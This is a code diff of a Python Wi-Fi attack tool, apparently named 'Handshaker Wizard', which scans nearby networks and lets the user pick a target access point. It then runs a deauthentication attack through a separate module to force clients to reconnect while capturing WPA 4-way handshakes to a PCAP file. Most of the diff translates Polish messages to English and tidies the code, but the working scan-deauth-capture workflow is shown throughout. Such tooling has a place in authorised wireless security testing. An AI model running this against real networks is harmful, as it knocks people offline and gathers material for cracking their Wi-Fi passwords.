@@ -23,35 +23,72 @@ COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
 COLOR_DIM = "\033[90m" if COLOR_ENABLED else ""
 STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""
 
+MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
+PROJECT_ROOT = os.path.dirname(MODULE_DIR)
+LOG_DIR = os.environ.get("SWISSKNIFE_LOG_DIR", os.path.join(PROJECT_ROOT, "log"))
+DEFAULT_HANDSHAKE_DIR = os.environ.get(
+    "SWISSKNIFE_HANDSHAKE_DIR", os.path.join(LOG_DIR, "handshakes")
+)
+
 DEFAULT_MONITOR_CHANNELS = (
     list(range(1, 15))
-    + [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165,]
+    + [
+        36,
+        40,
+        44,
+        48,
+        52,
+        56,
+        60,
+        64,
+        100,
+        104,
+        108,
+        112,
+        116,
+        120,
+        124,
+        128,
+        132,
+        136,
+        140,
+        144,
+        149,
+        153,
+        157,
+        161,
+        165,
+    ]
 )
 DEFAULT_HOP_INTERVAL = 0.8
-DEFAULT_UPDATE_INTERVAL = 0.5
+DEFAULT_LIVE_UPDATE_INTERVAL = 0.5
 MONITOR_SETTLE_SECONDS = 2.0
 
 try:
-    from scapy.all import AsyncSniffer, Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeResp, EAPOL, PcapWriter
-    from scapy.error import Scapy_Exception
+    from scapy.all import (  # type: ignore
+        AsyncSniffer,
+        Dot11,
+        Dot11Beacon,
+        Dot11Elt,
+        Dot11ProbeResp,
+        EAPOL,
+        PcapWriter,
+    )
+    from scapy.error import Scapy_Exception  # type: ignore
     SCAPY_AVAILABLE = True
 except Exception:
     SCAPY_AVAILABLE = False
-    Scapy_Exception = Exception
+    Scapy_Exception = Exception  # type: ignore
 
-# ────────────────────────────────────────────────────────────────
-#  IMPORT MODUŁU DEAUTH
-# ────────────────────────────────────────────────────────────────
+# Optional local module: modules/deauth.py
 try:
     import deauth
     DEAUTH_AVAILABLE = True
-except Exception as e:
-    logging.error(f"Nie udało się zaimportować deauth.py: {e}")
+    DEAUTH_IMPORT_ERROR: Optional[str] = None
+except Exception as exc:
+    deauth = None  # type: ignore[assignment]
     DEAUTH_AVAILABLE = False
-
-# ────────────────────────────────────────────────────────────────
-#  FUNKCJE POMOCNICZE
-# ────────────────────────────────────────────────────────────────
+    DEAUTH_IMPORT_ERROR = str(exc)
 
 def color_text(text: str, color: str) -> str:
     return f"{color}{text}{COLOR_RESET}" if color else text
@@ -453,16 +490,25 @@ def sorted_access_points(aps: Dict[str, AccessPoint]) -> List[AccessPoint]:
 
 def format_network_lines(sorted_aps: List[AccessPoint]) -> List[str]:
     if not sorted_aps:
-        return [color_text("No networks found.", COLOR_ERROR)]
+        return [color_text("No networks found.", COLOR_WARNING)]
 
     lines: List[str] = [style("Observed networks (sorted by clients):", STYLE_BOLD)]
     for index, ap in enumerate(sorted_aps, start=1):
-        color = COLOR_SUCCESS if ap.security == "WPA2" else COLOR_ERROR if ap.security == "WPA3" else COLOR_DIM
         ssid_label = format_ssid(ap.ssid)
         channel_label = str(ap.channel) if ap.channel else "?"
-        label = f"{index}) {ssid_label}"
-        details = f"{ap.bssid} | ch {channel_label} | {ap.security} | clients {len(ap.clients)}"
-        lines.append(f"  {color_text(label, color)} {details}")
+
+        security_color = (
+            COLOR_SUCCESS
+            if ap.security in {"WPA", "WPA2"}
+            else COLOR_WARNING
+            if ap.security == "WPA3"
+            else COLOR_DIM
+        )
+        security_label = color_text(ap.security, security_color)
+
+        label = f"{index}) {ssid_label} ({ap.bssid}) -"
+        details = f"ch {channel_label} | {security_label} | clients {len(ap.clients)}"
+        lines.append(f"  {color_text(label, COLOR_HIGHLIGHT)} {details}")
     return lines
 
 
@@ -496,10 +542,6 @@ def packet_matches_bssid(packet, bssid: str) -> bool:
     return bssid.lower() in (dot11.addr1 or "", dot11.addr2 or "", dot11.addr3 or "")
 
 
-# ────────────────────────────────────────────────────────────────
-#  DEAUTH + CAPTURE
-# ────────────────────────────────────────────────────────────────
-
 deauth_running = False
 
 
@@ -507,25 +549,26 @@ def run_deauth_background(interface: str, target: Dict[str, Optional[str]], dura
     global deauth_running
 
     if not DEAUTH_AVAILABLE:
-        logging.error("Moduł deauth.py nie został zaimportowany poprawnie.")
+        reason = f" ({DEAUTH_IMPORT_ERROR})" if DEAUTH_IMPORT_ERROR else ""
+        logging.warning("Deauth module is not available%s; continuing without deauth.", reason)
         return
 
-    logging.info(color_text("\n[DEAUTH] Uruchamiam atak deautentykacyjny...", COLOR_WARNING))
+    logging.info(color_text("\n[DEAUTH] Starting deauthentication attack...", COLOR_WARNING))
 
     try:
         deauth_running = True
         success = deauth.start_deauth_attack(interface, target)
         if success:
-            logging.info(color_text("Deauth działa...", COLOR_SUCCESS))
+            logging.info(color_text("Deauth running...", COLOR_SUCCESS))
             time.sleep(duration_sec)
         else:
-            logging.warning("Nie udało się uruchomić deauth – kontynuuję bez niego.")
-    except Exception as e:
-        logging.error(f"Błąd podczas uruchamiania deauth: {e}")
+            logging.warning("Failed to start deauth; continuing without it.")
+    except Exception as exc:
+        logging.error("Deauth error: %s", exc)
     finally:
         if deauth_running:
             deauth.stop_attack()
-            logging.info(color_text("Deauth zatrzymany.", COLOR_SUCCESS))
+            logging.info(color_text("Deauth stopped.", COLOR_SUCCESS))
         deauth_running = False
 
 
@@ -534,7 +577,7 @@ def capture_full_handshakes(
     ap: AccessPoint,
     total_duration_sec: int = 45,
     deauth_duration_sec: int = 20,
-    output_dir: str = "logs/handshakes"
+    output_dir: str = DEFAULT_HANDSHAKE_DIR,
 ) -> Optional[Dict]:
     os.makedirs(output_dir, exist_ok=True)
 
@@ -550,7 +593,10 @@ def capture_full_handshakes(
     eapol_count = 0
     clients_with_eapol = set()
 
-    eapol_states = {}  # client_mac → liczba wiadomości EAPOL
+    eapol_states: Dict[str, int] = {}  # client_mac -> number of EAPOL messages seen
+
+    start_time: Optional[float] = None
+    started = False
 
     try:
         writer = PcapWriter(pcap_path, append=False, sync=True)
@@ -563,7 +609,7 @@ def capture_full_handshakes(
 
             total_packets += 1
 
-            # Zapisujemy każdy pakiet (można później filtrować)
+            # Write every packet to PCAP (filter later in Wireshark).
             writer.write(pkt)
 
             if pkt.haslayer(EAPOL):
@@ -576,43 +622,54 @@ def capture_full_handshakes(
                             eapol_states[client] = 0
                         eapol_states[client] += 1
 
-                        # Bardzo prosta heurystyka – 4 kolejne EAPOL = prawdopodobny handshake
+                        # Very simple heuristic: 4 consecutive EAPOL messages -> likely full 4-way handshake.
                         if eapol_states[client] >= 4:
                             handshake_count += 1
-                            eapol_states[client] = 0  # resetujemy licznik po wykryciu
-                            logging.info(color_text(f"✓ Prawdopodobny kompletny 4-way handshake! (klient: {client})", COLOR_SUCCESS))
+                            eapol_states[client] = 0  # Reset counter after a likely complete handshake.
+                            logging.info(
+                                color_text(
+                                    f"[+] Possible complete 4-way handshake detected (client: {client})",
+                                    COLOR_SUCCESS,
+                                )
+                            )
 
         sniffer = AsyncSniffer(iface=interface, prn=packet_handler, store=False)
         sniffer.start()
 
-        # Uruchamiamy deauth w osobnym wątku
+        start_time = time.time()
+        started = True
+
+        # Start deauth in a background thread.
         target_dict = {
             "bssid": ap.bssid,
             "ssid": ap.ssid,
             "channel": ap.channel,
         }
 
-        deauth_thread = threading.Thread(
-            target=run_deauth_background,
-            args=(interface, target_dict, deauth_duration_sec),
-            daemon=True
-        )
-        deauth_thread.start()
+        if deauth_duration_sec > 0:
+            deauth_thread = threading.Thread(
+                target=run_deauth_background,
+                args=(interface, target_dict, deauth_duration_sec),
+                daemon=True,
+            )
+            deauth_thread.start()
 
-        # Główna pętla przechwytywania
-        start_time = time.time()
+        # Main capture loop.
         while True:
             elapsed = int(time.time() - start_time)
             remaining = total_duration_sec - elapsed
             if remaining <= 0:
                 break
 
-            status = f"Capture: {elapsed}s / {total_duration_sec}s   EAPOL: {eapol_count}   Handshake: {handshake_count}"
+            status = f"Capture: {elapsed}s / {total_duration_sec}s   EAPOL: {eapol_count}   Handshakes: {handshake_count}"
             print(f"\r{status.ljust(80)}", end="", flush=True)
             time.sleep(1)
 
     except KeyboardInterrupt:
-        logging.info("\nPrzerwano przez użytkownika (Ctrl+C)")
+        logging.info("\nInterrupted by user (Ctrl+C).")
+    except Exception as exc:
+        logging.error("Capture failed: %s", exc)
+        return None
     finally:
         if sniffer:
             try:
@@ -622,15 +679,24 @@ def capture_full_handshakes(
         if writer:
             writer.close()
 
-        print("\n" + "─" * 70)
-        logging.info(style("Podsumowanie przechwytywania:", STYLE_BOLD))
-        logging.info(f"  Plik:               {pcap_path}")
-        logging.info(f"  Czas trwania:       {int(time.time() - start_time)} sekund")
-        logging.info(f"  Wszystkie pakiety:  {total_packets}")
-        logging.info(f"  Pakiety EAPOL:      {eapol_count}")
-        logging.info(f"  Wykryte handshake:  {handshake_count}")
-        logging.info(f"  Klienci z EAPOL:    {len(clients_with_eapol)}")
-        print("─" * 70)
+        # Ensure we end the live "\r" progress line cleanly.
+        print("")
+
+        if started:
+            duration_sec = int(time.time() - (start_time or time.time()))
+        else:
+            duration_sec = 0
+
+        logging.info("")
+        logging.info("=" * 70)
+        logging.info(style("Capture summary:", STYLE_BOLD))
+        logging.info("  File:             %s", pcap_path)
+        logging.info("  Duration:         %s seconds", duration_sec)
+        logging.info("  Total packets:    %s", total_packets)
+        logging.info("  EAPOL packets:    %s", eapol_count)
+        logging.info("  Handshakes:       %s", handshake_count)
+        logging.info("  Clients w/ EAPOL: %s", len(clients_with_eapol))
+        logging.info("=" * 70)
 
     return {
         "path": pcap_path,
@@ -642,8 +708,8 @@ def capture_full_handshakes(
 
 
 def main() -> None:
-    logging.info(color_text("Handshaker + Deauth", COLOR_HEADER))
-    logging.info("Skan → wybór AP → deauth → przechwytywanie handshake'ów")
+    logging.info(color_text("Handshaker Wizard", COLOR_HEADER))
+    logging.info("Scan → select AP → deauth → capture handshakes (PCAP)")
     logging.info("")
 
     if os.geteuid() != 0:
@@ -660,8 +726,12 @@ def main() -> None:
             logging.error("Required tool '%s' not found!", tool)
             sys.exit(1)
 
-    logging.info(style("Uwaga:", STYLE_BOLD))
-    logging.info("Używaj wyłącznie na własnych sieciach i urządzeniach.")
+    if not DEAUTH_AVAILABLE:
+        reason = f" ({DEAUTH_IMPORT_ERROR})" if DEAUTH_IMPORT_ERROR else ""
+        logging.warning("Deauth module: unavailable%s. Capture will run without deauth.", reason)
+
+    logging.info(style("IMPORTANT:", COLOR_WARNING, STYLE_BOLD))
+    logging.info("Use only on networks you own or have explicit permission to test!")
     logging.info("")
 
     interfaces = list_network_interfaces()
@@ -673,28 +743,28 @@ def main() -> None:
     try:
         if original_mode != "monitor":
             logging.info("")
-            input(f"{style('Press Enter', STYLE_BOLD)} aby przełączyć {interface} w tryb monitor...")
+            input(f"{style('Press Enter', STYLE_BOLD)} to switch {interface} to monitor mode...")
             if not set_interface_type(interface, "monitor"):
-                logging.error(f"Nie udało się włączyć trybu monitor na {interface}.")
+                logging.error("Failed to enable monitor mode on %s.", interface)
                 sys.exit(1)
             changed_to_monitor = True
             wait_for_monitor_settle(interface)
 
         logging.info("")
         scan_duration = prompt_int(
-            f"{style('Czas skanowania', STYLE_BOLD)} (sekundy) "
+            f"{style('Scan duration', STYLE_BOLD)} (seconds) "
             f"({style('Enter', STYLE_BOLD)} = 15s): ",
             default=15
         )
 
         logging.info("")
-        input(f"{style('Press Enter', STYLE_BOLD)} aby rozpocząć skanowanie...")
+        input(f"{style('Press Enter', STYLE_BOLD)} to start scanning...")
         aps = scan_networks(
             interface,
             scan_duration,
             channels=DEFAULT_MONITOR_CHANNELS,
             hop_interval=DEFAULT_HOP_INTERVAL,
-            update_interval=DEFAULT_UPDATE_INTERVAL,
+            update_interval=DEFAULT_LIVE_UPDATE_INTERVAL,
         )
 
         sorted_aps = sorted_access_points(aps)
@@ -703,36 +773,39 @@ def main() -> None:
             logging.info("%s", line)
 
         if not sorted_aps:
-            logging.info("Nie znaleziono żadnych sieci.")
+            logging.info("No networks found.")
             return
 
         logging.info("")
         target_ap = select_access_point(sorted_aps)
         if target_ap is None:
-            logging.info("Nie wybrano celu. Kończę działanie.")
+            logging.info("No target selected. Exiting.")
             return
 
         logging.info("")
-        logging.info(f"Wybrano: {format_ssid(target_ap.ssid)} ({target_ap.bssid})")
+        logging.info("Selected: %s (%s)", format_ssid(target_ap.ssid), target_ap.bssid)
         if target_ap.channel:
-            logging.info(f"Kanał: {target_ap.channel}")
+            logging.info("Channel: %s", target_ap.channel)
             set_interface_channel(interface, target_ap.channel)
         else:
-            logging.warning("Kanał AP nieznany – zostajemy na obecnym kanale.")
+            logging.warning("AP channel unknown; staying on the current channel.")
 
         capture_total_sec = prompt_int(
-            f"{style('Całkowity czas przechwytywania', STYLE_BOLD)} (sekundy) "
+            f"{style('Total capture time', STYLE_BOLD)} (seconds) "
             f"({style('Enter', STYLE_BOLD)} = 45s): ",
             default=45,
             minimum=20
         )
 
-        deauth_sec = min(25, capture_total_sec - 10)  # deauth krócej niż cały capture
+        # Keep deauth shorter than the total capture window.
+        deauth_sec = min(25, capture_total_sec - 10)
+        if not DEAUTH_AVAILABLE:
+            deauth_sec = 0
 
         logging.info("")
-        input(f"{style('Press Enter', STYLE_BOLD)} aby rozpocząć deauth + przechwytywanie...")
+        input(f"{style('Press Enter', STYLE_BOLD)} to start deauth + capture...")
 
-        output_dir = os.path.join(os.getcwd(), "logs", "handshakes")
+        output_dir = DEFAULT_HANDSHAKE_DIR
         summary = capture_full_handshakes(
             interface=interface,
             ap=target_ap,
@@ -743,17 +816,17 @@ def main() -> None:
 
         if summary:
             logging.info("")
-            logging.info(style("Zapisano do:", STYLE_BOLD))
+            logging.info(style("Saved to:", STYLE_BOLD))
             logging.info(f"  → {summary['path']}")
-            logging.info(f"  Wykryte pełne handshake'i: {summary['detected_handshakes']}")
-            logging.info("Otwórz plik w Wireshark i filtruj: eapol")
+            logging.info("  Detected full handshakes: %s", summary["detected_handshakes"])
+            logging.info("Open in Wireshark and filter: eapol")
 
     finally:
         if changed_to_monitor:
-            logging.info("Przywracam tryb managed...")
+            logging.info("Restoring managed mode...")
             restore_managed_mode(interface)
 
-    input(style("\nNaciśnij Enter, aby zakończyć.", STYLE_BOLD))
+    input(style("\nPress Enter to exit.", STYLE_BOLD))
 
 
 if __name__ == "__main__":
